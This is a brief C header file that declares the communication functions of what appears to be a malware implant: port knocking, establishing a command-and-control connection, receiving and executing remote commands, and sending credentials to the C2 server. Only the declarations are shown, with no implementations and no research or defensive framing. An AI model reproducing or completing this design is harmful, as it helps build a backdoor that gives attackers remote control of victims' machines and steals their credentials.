#ifndef COMMUNICATION_H
#define COMMUNICATION_H

void initiate_port_knocking();
void establish_c2_connection();
void receive_and_execute_commands(int sock);
void send_credentials_to_c2(const char *credentials);

#endif
